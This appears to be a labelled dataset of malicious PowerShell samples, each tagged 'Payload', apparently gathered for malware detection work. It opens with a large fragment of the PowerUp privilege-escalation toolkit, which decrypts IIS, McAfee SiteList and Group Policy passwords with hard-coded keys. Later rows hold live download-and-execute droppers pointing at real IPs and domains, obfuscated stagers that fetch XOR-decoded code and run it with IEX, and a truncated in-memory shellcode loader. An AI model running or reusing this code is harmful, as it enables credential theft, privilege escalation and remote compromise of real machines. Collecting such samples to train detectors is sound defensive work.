        $Null = $DataTable.Columns.Add(""dbserv"")
        $Null = $DataTable.Columns.Add(""vdir"")
        $Null = $DataTable.Columns.Add(""path"")
        $Null = $DataTable.Columns.Add(""encr"")

        
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
        ForEach-Object {

            $CurrentVdir = $_

            
            if ($_ -like ""*%*"") {
                $EnvarName = ""`$Env:""+$_.split(""%"")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split(""%"")[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                
                $CurrentPath = $_.fullname

                
                [xml]$ConfigFile = Get-Content $_.fullname

                
                if ($ConfigFile.configuration.connectionStrings.add) {

                    
                    $ConfigFile.configuration.connectionStrings.add| 
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if($MyConString -like ""*password*"") {
                            $ConfUser = $MyConString.Split(""="")[3].Split("";"")[0]
                            $ConfPass = $MyConString.Split(""="")[4].Split("";"")[0]
                            $ConfServ = $MyConString.Split(""="")[1].Split("";"")[0]
                            $ConfVdir = $CurrentVdir
                            $ConfPath = $CurrentPath
                            $ConfEnc = ""No""
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    
                    $AspnetRegiisPath = Get-ChildItem -Path ""$Env:SystemRoot\Microsoft.NET\Framework\"" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        
                        $WebConfigPath = (Get-Item $Env:temp).FullName + ""\web.config""

                        
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        
                        Copy-Item $CurrentPath $WebConfigPath

                        
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf ""connectionStrings"" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if($MyConString -like ""*password*"") {
                                    $ConfUser = $MyConString.Split(""="")[3].Split("";"")[0]
                                    $ConfPass = $MyConString.Split(""="")[4].Split("";"")[0]
                                    $ConfServ = $MyConString.Split(""="")[1].Split("";"")[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfPath = $CurrentPath
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                                }
                            }

                        }
                        else {
                            Write-Verbose ""Decryption of $CurrentPath failed.""
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }

        
        if( $DataTable.rows.Count -gt 0 ) {
            
            $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose 'No connection strings found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-ApplicationHost {
 

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = ""SilentlyContinue""

    
    if (Test-Path  (""$Env:SystemRoot\System32\inetsrv\appcmd.exe"")) {
        
        $DataTable = New-Object System.Data.DataTable

        
        $Null = $DataTable.Columns.Add(""user"")
        $Null = $DataTable.Columns.Add(""pass"")
        $Null = $DataTable.Columns.Add(""type"")
        $Null = $DataTable.Columns.Add(""vdir"")
        $Null = $DataTable.Columns.Add(""apppool"")

        
        Invoke-Expression ""$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name"" | ForEach-Object {

            
            $PoolName = $_

            
            $PoolUserCmd = ""$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool "" + ""`""$PoolName`"" /text:processmodel.username""
            $PoolUser = Invoke-Expression $PoolUserCmd

            
            $PoolPasswordCmd = ""$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool "" + ""`""$PoolName`"" /text:processmodel.password""
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            
            if (($PoolPassword -ne """") -and ($PoolPassword -isnot [system.array])) {
                
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        
        Invoke-Expression ""$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name"" | ForEach-Object {

            
            $VdirName = $_

            
            $VdirUserCmd = ""$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir "" + ""`""$VdirName`"" /text:userName""
            $VdirUser = Invoke-Expression $VdirUserCmd

            
            $VdirPasswordCmd = ""$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir "" + ""`""$VdirName`"" /text:password""
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            
            if (($VdirPassword -ne """") -and ($VdirPassword -isnot [system.array])) {
                
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        
        if( $DataTable.rows.Count -gt 0 ) {
            
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-SiteListPassword {


    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String[]]
        $Path
    )

    BEGIN {
        function Local:Get-DecryptedSitelistPassword {
            
            
            
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [String]
                $B64Pass
            )

            
            Add-Type -Assembly System.Security
            Add-Type -Assembly System.Core

            
            $Encoding = [System.Text.Encoding]::ASCII
            $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
            $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

            
            $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

            
            $I = 0;
            $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

            
            $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@

            
            $3DES.Mode = 'ECB'
            $3DES.Padding = 'None'
            $3DES.Key = $3DESKey

            
            $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

            
            $Index = [Array]::IndexOf($Decrypted, [Byte]0)
            if($Index -ne -1) {
                $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
            }
            else {
                $DecryptedPass = $Encoding.GetString($Decrypted)
            }

            New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
        }

        function Local:Get-SitelistFields {
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [String]
                $Path
            )

            try {
                [Xml]$SiteListXml = Get-Content -Path $Path

                if($SiteListXml.InnerXml -Like ""*password*"") {
                    Write-Verbose ""Potential password in found in $Path""

                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $PasswordRaw = $_.Password.'

                            if($_.Password.Encrypted -eq 1) {
                                
                                $DecPassword = if($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                            }
                            else {
                                $DecPassword = $PasswordRaw
                            }

                            $Server = if($_.ServerIP) { $_.ServerIP } else { $_.Server }
                            $Path = if($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                            $ObjectProperties = @{
                                'Name' = $_.Name;
                                'Enabled' = $_.Enabled;
                                'Server' = $Server;
                                'Path' = $Path;
                                'DomainName' = $_.DomainName;
                                'UserName' = $_.UserName;
                                'EncPassword' = $PasswordRaw;
                                'DecPassword' = $DecPassword;
                            }
                            New-Object -TypeName PSObject -Property $ObjectProperties
                        }
                        catch {
                            Write-Verbose ""Error parsing node : $_""
                        }
                    }
                }
            }
            catch {
                Write-Warning ""Error parsing file '$Path' : $_""
            }
        }
    }

    PROCESS {
        if($PSBoundParameters['Path']) {
            $XmlFilePaths = $Path
        }
        else {
            $XmlFilePaths = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
        }

        $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
            Write-Verbose ""Parsing SiteList.xml file '$($_.Fullname)'""
            Get-SitelistFields -Path $_.Fullname
        }
    }
}


function Get-CachedGPPPassword {

    
    [CmdletBinding()]
    Param()
    
    
    Set-StrictMode -Version 2

    
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core
    
    
    function local:Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword 
        )

        try {
            
            $Mod = ($Cpassword.length % 4)
            
            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    
    function local:Get-GPPInnerFields {
        [CmdletBinding()]
        Param (
            $File 
        )
    
        try {
            
            $Filename = Split-Path $File -Leaf
            [XML] $Xml = Get-Content ($File)

            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
    
            
            if ($Xml.innerxml -like ""*cpassword*""){
            
                Write-Verbose ""Potential password in $File""
                
                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml ""/Groups/User/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/Groups/User/Properties/@userName"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml ""/Groups/User/Properties/@newName"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/Groups/User/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Services.xml' {  
                        $Cpassword += , $Xml | Select-Xml ""/NTServices/NTService/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/NTServices/NTService/Properties/@accountName"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/NTServices/NTService/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml ""/ScheduledTasks/Task/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/ScheduledTasks/Task/Properties/@runAs"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/ScheduledTasks/Task/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $Cpassword += , $Xml | Select-Xml ""/DataSources/DataSource/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/DataSources/DataSource/Properties/@username"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/DataSources/DataSource/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $Cpassword += , $Xml | Select-Xml ""/Printers/SharedPrinter/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/Printers/SharedPrinter/Properties/@username"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/Printers/SharedPrinter/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $Cpassword += , $Xml | Select-Xml ""/Drives/Drive/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/Drives/Drive/Properties/@username"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/Drives/Drive/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Pass in $Cpassword) {
               Write-Verbose ""Decrypting $Pass""
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose ""Decrypted a password of $DecryptedPassword""
               
               $Password += , $DecryptedPassword
           }
            
            
            if (-not $Password) {$Password = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}
                  
            
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose ""The password is between {} and may be more than one value.""
            if ($ResultsObject) {Return $ResultsObject} 
        }

        catch {Write-Error $Error[0]}
    }
    
    try {
        $AllUsers = $Env:ALLUSERSPROFILE

        if($AllUsers -notmatch 'ProgramData') {
            $AllUsers = ""$AllUsers\Application Data""
        }

        
        $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
    
        if ( -not $XMlFiles ) {
            Write-Verbose 'No preference files found.'
        }
        else {
            Write-Verbose ""Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords.""

            ForEach ($File in $XMLFiles) {
                Get-GppInnerFields $File.Fullname
            }
        }
    }

    catch {Write-Error $Error[0]}
}


function Write-UserAddMSI {


    $Path = 'UserAdd.msi'

    $Binary = """"

    try {
        [System.Convert]::FromBase64String( $Binary ) | Set-Content -Path $Path -Encoding Byte
        Write-Verbose ""MSI written out to '$Path'""

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'OutputPath' $Path
        $Out
    }
    catch {
        Write-Warning ""Error while writing to location '$Path': $_""
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'OutputPath' $_
        $Out
    }
}


function Invoke-AllChecks {


    [CmdletBinding()]
    Param(
        [Switch]
        $HTMLReport
    )

    if($HTMLReport) {
        $HtmlReportFile = ""$($Env:ComputerName).$($Env:UserName).html""

        $Header = ""<style>""
        $Header = $Header + ""BODY{background-color:peachpuff;}""
        $Header = $Header + ""TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}""
        $Header = $Header + ""TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}""
        $Header = $Header + ""TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}""
        $Header = $Header + ""</style>""

        ConvertTo-HTML -Head $Header -Body ""<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>"" | Out-File $HtmlReportFile
    }

    

    ""`n[*] Running Invoke-AllChecks""

    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] ""Administrator"")

    if($IsAdmin){
        ""[+] Current user already has local administrative privileges!""

        if($HTMLReport) {
            ConvertTo-HTML -Head $Header -Body ""<H2>User Has Local Admin Privileges!</H2>"" | Out-File -Append $HtmlReportFile
        }
    }
    else{
        ""`n`n[*] Checking if user is in a local group with administrative privileges...""

        $CurrentUserSids = Get-CurrentUserTokenGroupSid | Select-Object -ExpandProperty SID
        if($CurrentUserSids -contains 'S-1-5-32-544') {
            ""[+] User is in a local group that grants administrative privileges!""
            ""[+] Run a BypassUAC attack to elevate privileges to admin.""

            if($HTMLReport) {
                ConvertTo-HTML -Head $Header -Body ""<H2> User In Local Group With Administrative Privileges</H2>"" | Out-File -Append $HtmlReportFile
            }
        }
    }


    

    ""`n`n[*] Checking for unquoted service paths...""
    $Results = Get-ServiceUnquoted
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>Unquoted Service Paths</H2>"" | Out-File -Append $HtmlReportFile
    }

    ""`n`n[*] Checking service executable and argument permissions...""
    $Results = Get-ModifiableServiceFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>Service File Permissions</H2>"" | Out-File -Append $HtmlReportFile
    }

    ""`n`n[*] Checking service permissions...""
    $Results = Get-ModifiableService
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>Modifiable Services</H2>"" | Out-File -Append $HtmlReportFile
    }


    

    ""`n`n[*] Checking %PATH% for potentially hijackable DLL locations...""
    $Results = Find-PathDLLHijack
    $Results | Where-Object {$_} | Foreach-Object {
        $AbuseString = ""Write-HijackDll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'""
        $_ | Add-Member Noteproperty 'AbuseFunction' $AbuseString
        $_
    } | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>%PATH% .dll Hijacks</H2>"" | Out-File -Append $HtmlReportFile
    }


    

    ""`n`n[*] Checking for AlwaysInstallElevated registry key...""
    if (Get-RegistryAlwaysInstallElevated) {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'AbuseFunction' ""Write-UserAddMSI""
        $Results = $Out

        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Head $Header -Body ""<H2>AlwaysInstallElevated</H2>"" | Out-File -Append $HtmlReportFile
        }
    }

    ""`n`n[*] Checking for Autologon credentials in registry...""
    $Results = Get-RegistryAutoLogon
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>Registry Autologons</H2>"" | Out-File -Append $HtmlReportFile
    }


    ""`n`n[*] Checking for modifidable registry autoruns and configs...""
    $Results = Get-ModifiableRegistryAutoRun
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>Registry Autoruns</H2>"" | Out-File -Append $HtmlReportFile
    }

    

    ""`n`n[*] Checking for modifiable schtask files/configs...""
    $Results = Get-ModifiableScheduledTaskFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>Modifidable Schask Files</H2>"" | Out-File -Append $HtmlReportFile
    }

    ""`n`n[*] Checking for unattended install files...""
    $Results = Get-UnattendedInstallFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>Unattended Install Files</H2>"" | Out-File -Append $HtmlReportFile
    }

    ""`n`n[*] Checking for encrypted web.config strings...""
    $Results = Get-Webconfig | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>Encrypted 'web.config' String</H2>"" | Out-File -Append $HtmlReportFile
    }

    ""`n`n[*] Checking for encrypted application pool and virtual directory passwords...""
    $Results = Get-ApplicationHost | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>Encrypted Application Pool Passwords</H2>"" | Out-File -Append $HtmlReportFile
    }

    ""`n`n[*] Checking for plaintext passwords in McAfee SiteList.xml files....""
    $Results = Get-SiteListPassword | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>McAfee's SiteList.xml's</H2>"" | Out-File -Append $HtmlReportFile
    }
    ""`n""

    ""`n`n[*] Checking for cached Group Policy Preferences .xml files....""
    $Results = Get-CachedGPPPassword | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body ""<H2>Cached GPP Files</H2>"" | Out-File -Append $HtmlReportFile
    }
    ""`n""

    if($HTMLReport) {
        ""[*] Report written to '$HtmlReportFile' `n""
    }
}



$Module = New-InMemoryModule -ModuleName PowerUpModule

$FunctionDefinitions = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @())
    (func advapi32 OpenProcessToken ([Bool]) @( [IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError)
)


$ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
    QueryConfig =           '0x00000001'
    ChangeConfig =          '0x00000002'
    QueryStatus =           '0x00000004'
    EnumerateDependents =   '0x00000008'
    Start =                 '0x00000010'
    Stop =                  '0x00000020'
    PauseContinue =         '0x00000040'
    Interrogate =           '0x00000080'
    UserDefinedControl =    '0x00000100'
    Delete =                '0x00010000'
    ReadControl =           '0x00020000'
    WriteDac =              '0x00040000'
    WriteOwner =            '0x00080000'
    Synchronize =           '0x00100000'
    AccessSystemSecurity =  '0x01000000'
    GenericAll =            '0x10000000'
    GenericExecute =        '0x20000000'
    GenericWrite =          '0x40000000'
    GenericRead =           '0x80000000'
    AllAccess =             '0x000F01FF'
} -Bitfield

$SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
    SE_GROUP_ENABLED =              '0x00000004'
    SE_GROUP_ENABLED_BY_DEFAULT =   '0x00000002'
    SE_GROUP_INTEGRITY =            '0x00000020'
    SE_GROUP_INTEGRITY_ENABLED =    '0xC0000000'
    SE_GROUP_MANDATORY =            '0x00000001'
    SE_GROUP_OWNER =                '0x00000008'
    SE_GROUP_RESOURCE =             '0x20000000'
    SE_GROUP_USE_FOR_DENY_ONLY =    '0x00000010'
} -Bitfield

$SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}

$TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
902f544f9ef3d22f64135169551b9affa599857cdc781af26f91ac4f6cf15d8e,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/yspcsr.exe',""$env:TEMP\drv.docx"");Start-Process (""$env:TEMP\drv.docx"")

",Payload
4af7562b8ca6f68be6a55c4070fc4746727991c61f81392cc3bb52990d80c5c1,"
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

",Payload
f66ab0eec736e3d36e729881a99e2eb14114d924c1f8a660e76af4fe83b56a1c,"
$Wc=NEW-ObjEct SYsTem.NeT.WebClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEAdErS.AdD('User-Agent',$u);$Wc.PrOxy = [SysTem.NeT.WeBREQueSt]::DefAULtWebProXy;$Wc.PRoXy.CredENTialS = [SYStem.Net.CrEdeNTIaLCaCHe]::DEFAUltNeTworkCreDeNTiAlS;$K='2bab33eb798937f2b3535936798024ce';$I=0;[CHAR[]]$B=([chAR[]]($wc.DOWnLOadSTRinG(""http://ahyses.ddns.net:4444/index.asp"")))|%{$_-bXor$k[$I++%$k.LeNGTh]};IEX ($b-jOiN'')

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
6fe69ef0612ff032fbf24071d6dcec751146464e9845783f121f535b8e00fc55,"
$WC=NEw-OBJEcT SyStEm.NET.WebCliEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEaDErS.ADD('User-Agent',$u);$wc.ProxY = [SYStEM.NET.WebREQueST]::DEfAuLtWEBProXY;$WC.PrOxy.CrEdEntiALS = [SYSteM.NET.CREdenTIalCache]::DEFaUltNetWORkCRedentIALs;$K='@^.B!MvcfVCA2D~+8*JK}w14lj|Wip(>';$i=0;[ChAR[]]$B=([cHAR[]]($wc.DOwnLoadSTRing(""http://10.60.13.238:8082/index.asp"")))|%{$_-bXor$k[$i++%$K.LEnGTH]};IEX ($b-JoiN'')

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
4888aa12e624d3fe501e4d32a4ee3ad845008eb523b5d131b162125706629f6d,"
$0IA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $0IA -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 